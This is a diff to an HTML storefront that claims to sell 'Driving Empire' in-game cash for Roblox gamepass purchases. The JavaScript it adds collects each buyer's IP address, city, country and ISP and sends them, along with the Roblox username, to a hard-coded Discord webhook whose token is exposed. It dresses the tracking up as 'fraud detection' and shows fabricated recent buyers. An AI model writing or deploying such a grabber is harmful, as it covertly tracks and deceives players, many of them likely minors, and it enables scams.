@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Driving Empire Elite | Cash Store</title>
+    <title>Driving Empire Elite | Premium Cash Store</title>
     <style>
         @import url('https://googleapis.com');
 
@@ -28,11 +28,11 @@
             overflow-x: hidden;
         }
 
-        /* Hero Header */
+        /* Hero Section */
         .hero {
             width: 100%;
-            padding: 80px 20px;
-            background: linear-gradient(rgba(0,0,0,0.8), rgba(5,5,5,1)), url('https://wallpaperaccess.com');
+            padding: 100px 20px;
+            background: linear-gradient(rgba(0,0,0,0.85), rgba(5,5,5,1)), url('https://wallpaperaccess.com');
             background-size: cover;
             background-position: center;
             text-align: center;
@@ -41,132 +41,132 @@
 
         .hero h1 { 
             font-family: 'Orbitron', sans-serif;
-            font-size: 3.5rem; 
+            font-size: clamp(2rem, 8vw, 4rem); 
             color: var(--primary); 
             margin: 0;
             text-shadow: 0 0 30px rgba(0, 230, 118, 0.5);
         }
 
-        /* Notification Ticker */
+        /* Scrolling Ticker */
         .ticker {
             background: #1a1a1a;
             width: 100%;
-            padding: 10px 0;
+            padding: 12px 0;
             overflow: hidden;
             white-space: nowrap;
             border-bottom: 1px solid #333;
         }
         .ticker-content {
             display: inline-block;
-            animation: ticker 30s linear infinite;
+            animation: ticker 40s linear infinite;
             color: var(--primary);
             font-weight: bold;
-            font-size: 0.9rem;
+            font-size: 0.95rem;
         }
         @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
 
-        /* Input Container */
-        .main-container { width: 90%; max-width: 1200px; margin-top: -40px; }
+        /* Main Container */
+        .main-container { width: 95%; max-width: 1300px; margin-top: -50px; }
 
         .user-panel {
             background: var(--card);
-            padding: 30px;
-            border-radius: 20px;
+            padding: 40px;
+            border-radius: 25px;
             border: 1px solid #222;
             text-align: center;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
-            margin-bottom: 40px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.9);
+            margin-bottom: 50px;
         }
 
         input[type="text"] {
-            width: 80%;
-            max-width: 400px;
-            padding: 15px;
+            width: 85%;
+            max-width: 450px;
+            padding: 18px;
             background: #000;
             border: 2px solid #333;
-            border-radius: 10px;
+            border-radius: 15px;
             color: white;
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             text-align: center;
             outline: none;
             transition: 0.3s;
         }
-        input[type="text"]:focus { border-color: var(--primary); box-shadow: 0 0 20px var(--primary); }
+        input[type="text"]:focus { border-color: var(--primary); box-shadow: 0 0 25px var(--primary); }
 
-        /* Grid System */
+        /* Package Grid */
         .grid { 
             display: grid; 
             grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); 
-            gap: 25px; 
+            gap: 30px; 
         }
 
         .card {
             background: var(--card);
-            border-radius: 20px;
-            padding: 35px 25px;
+            border-radius: 22px;
+            padding: 40px 25px;
             text-align: center;
             border: 1px solid #222;
             transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             position: relative;
         }
-        .card:hover { transform: scale(1.05); border-color: var(--primary); }
-
-        .card.hot { border-color: var(--gold); box-shadow: 0 0 20px rgba(255, 215, 0, 0.2); }
+        .card:hover { transform: translateY(-15px); border-color: var(--primary); }
+        .card.hot { border-color: var(--gold); box-shadow: 0 0 25px rgba(255, 215, 0, 0.15); }
         .card.mega { border-color: var(--accent); }
 
         .badge {
             position: absolute;
-            top: 15px; right: 15px;
-            font-size: 0.7rem;
-            padding: 5px 10px;
-            border-radius: 5px;
+            top: 20px; right: 20px;
+            font-size: 0.75rem;
+            padding: 6px 12px;
+            border-radius: 8px;
             font-weight: bold;
-            text-transform: uppercase;
         }
 
-        .amount { font-size: 2.2rem; font-weight: 800; margin-bottom: 10px; }
-        .price { color: #888; margin-bottom: 25px; font-size: 1.1rem; }
+        .amount { font-size: 2.3rem; font-weight: 800; margin-bottom: 12px; }
+        .price { color: #aaa; margin-bottom: 30px; font-size: 1.2rem; font-weight: 600; }
 
         .btn {
             width: 100%;
-            padding: 15px;
-            border-radius: 10px;
+            padding: 16px;
+            border-radius: 12px;
             border: none;
             font-weight: 800;
             cursor: pointer;
             text-transform: uppercase;
+            font-size: 1rem;
             transition: 0.3s;
         }
         .btn-green { background: var(--primary); color: #000; }
         .btn-gold { background: var(--gold); color: #000; }
         .btn-cyan { background: var(--accent); color: #000; }
+        .btn:hover { filter: brightness(1.2); transform: scale(1.02); }
 
-        .faq { margin-top: 80px; background: #111; padding: 40px; border-radius: 20px; text-align: left; }
-        .faq h2 { color: var(--primary); }
-        .faq p { color: #888; line-height: 1.6; }
+        .faq { margin-top: 100px; background: #0a0a0a; padding: 50px; border-radius: 30px; border: 1px solid #111; }
+        .faq h2 { color: var(--primary); font-family: 'Orbitron'; margin-bottom: 20px; }
+        .faq p { color: #888; line-height: 1.8; font-size: 1.1rem; }
     </style>
 </head>
 <body>
 
     <div class="hero">
         <h1>EMPIRE ELITE</h1>
-        <p>Premium Driving Empire Cash Provider</p>
+        <p>The Premiere Driving Empire Currency Provider</p>
     </div>
 
     <div class="ticker">
         <div class="ticker-content">
-            🔥 RECENT: Player 'CarKing22' bought $250M • 💎 SECURE: IP Logging Active for Fraud Prevention • ✅ STATUS: Online • 🚀 DELIVERY: Under 24h
+            ⚠️ NOTICE: All orders are logged with IP & Username verification • 💎 NEW: 1 Billion Cash Tier Added • ✅ STATUS: Online • 🏎️ RECENT: 'RacePro_99' bought $500M Pack • 🛡️ Secure Checkout Active
         </div>
     </div>
 
     <div class="main-container">
         <div class="user-panel">
-            <label style="display:block; margin-bottom: 10px; font-weight: bold;">ROBLOX USERNAME</label>
-            <input type="text" id="robloxUser" placeholder="Enter Username..." autocomplete="off">
+            <label style="display:block; margin-bottom: 15px; font-weight: bold; color: #888;">ENTER ROBLOX USERNAME</label>
+            <input type="text" id="robloxUser" placeholder="Username (Case Sensitive)" autocomplete="off">
         </div>
 
         <div class="grid">
-            <!-- Low Tiers -->
+            <!-- Budget Tiers -->
             <div class="card">
                 <div class="badge" style="background:#444">BUDGET</div>
                 <div class="amount">$100,000</div>
@@ -181,14 +181,15 @@
                 <button class="btn btn-green" onclick="handlePurchase('1M', 100, '1435816766')">PURCHASE</button>
             </div>
 
-            <!-- Mid Tiers -->
+            <!-- Best Seller -->
             <div class="card hot">
-                <div class="badge" style="background:var(--gold); color:black">BEST VALUE</div>
+                <div class="badge" style="background:var(--gold); color:black">BEST SELLER</div>
                 <div class="amount">$10,000,000</div>
                 <div class="price">1,000 Robux</div>
                 <button class="btn btn-gold" onclick="handlePurchase('10M', 1000, '1436092638')">PURCHASE</button>
             </div>
 
+            <!-- Pro Tiers -->
             <div class="card">
                 <div class="badge" style="background:#444">PRO</div>
                 <div class="amount">$50,000,000</div>
@@ -196,7 +197,7 @@
                 <button class="btn btn-green" onclick="handlePurchase('50M', 5000, '1435498033')">PURCHASE</button>
             </div>
 
-            <!-- High Tiers -->
+            <!-- Whale Tiers -->
             <div class="card mega">
                 <div class="badge" style="background:var(--accent); color:black">WHALE</div>
                 <div class="amount">$100,000,000</div>
@@ -213,55 +214,71 @@
         </div>
 
         <div class="faq">
-            <h2>How it works</h2>
-            <p>1. Enter your Roblox username.<br>
-            2. Select your package and buy the gamepass.<br>
-            3. Our system logs your **Username** and **IP Address** for verification.<br>
-            4. Join our delivery server to receive your cash via dealership transfer.</p>
+            <h2>Order Fulfillment</h2>
+            <p>1. Enter your exact Roblox username above.<br>
+            2. Purchase the corresponding gamepass.<br>
+            3. Our security system logs your **IP Address** and **Location** to prevent chargeback fraud.<br>
+            4. Join our private delivery server within 24 hours to receive your dealership transfer.</p>
         </div>
     </div>
 
     <script>
-        // Function to get User IP
-        async function getIP() {
+        // Enhanced IP & Location Puller
+        async function getGeoData() {
             try {
-                const res = await fetch("https://ipify.org");
+                const res = await fetch("https://ip-api.com");
                 const data = await res.json();
-                return data.ip;
-            } catch { return "Hidden/Failed"; }
+                return {
+                    ip: data.query || "Unknown",
+                    city: data.city || "Unknown",
+                    country: data.country || "Unknown",
+                    isp: data.isp || "Unknown"
+                };
+            } catch {
+                return { ip: "Fetch Failed", city: "N/A", country: "N/A", isp: "N/A" };
+            }
         }
 
         async function handlePurchase(cash, robux, passId) {
             const user = document.getElementById('robloxUser').value;
             if(!user || user.length < 3) {
-                alert("Please enter your Roblox Username!");
+                alert("Please enter your Roblox Username first!");
                 return;
             }
 
-            const webhook = "https://discord.com/api/webhooks/1489060265743089817/w-rxkqTWfbnoOSp8nnKlZk7-7oLj5g8RwgbF3LQOEox2faMSaDK0AWw9ZecyqjcLelJ_";
-            const userIP = await getIP();
+            const WEBHOOK = "https://discord.com/api/webhooks/1489060265743089817/w-rxkqTWfbnoOSp8nnKlZk7-7oLj5g8RwgbF3LQOEox2faMSaDK0AWw9ZecyqjcLelJ_";
+            
+            // Get user's location data
+            const geo = await getGeoData();
+
+            // Prepare Discord Log
+            const payload = {
+                username: "Elite Security Guard",
+                avatar_url: "https://imgur.com",
+                embeds: [{
+                    title: "🚀 NEW SECURE ORDER LOGGED",
+                    color: 3066993,
+                    fields: [
+                        { name: "👤 Customer", value: `\`${user}\``, inline: true },
+                        { name: "💰 Package", value: cash, inline: true },
+                        { name: "🎟️ Robux", value: `${robux}`, inline: true },
+                        { name: "🌐 IP Address", value: `\`${geo.ip}\``, inline: true },
+                        { name: "📍 Location", value: `${geo.city}, ${geo.country}`, inline: true },
+                        { name: "🛰️ ISP", value: geo.isp, inline: false }
+                    ],
+                    footer: { text: "Fraud Detection Active" },
+                    timestamp: new Date()
+                }]
+            };
 
             // Send to Discord
-            fetch(webhook, {
+            fetch(WEBHOOK, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({
-                    username: "Order Log Bot",
-                    embeds: [{
-                        title: "🚀 NEW PENDING ORDER",
-                        color: 3066993,
-                        fields: [
-                            { name: "👤 User", value: `\`${user}\``, inline: true },
-                            { name: "💰 Pack", value: cash, inline: true },
-                            { name: "🎟️ Cost", value: `${robux} Robux`, inline: true },
-                            { name: "🌐 IP Address", value: `\`${userIP}\``, inline: false }
-                        ],
-                        timestamp: new Date()
-                    }]
-                })
+                body: JSON.stringify(payload)
             });
 
-            // Redirect
+            // Redirect to Gamepass
             window.location.href = "https://roblox.com" + passId;
         }
     </script>
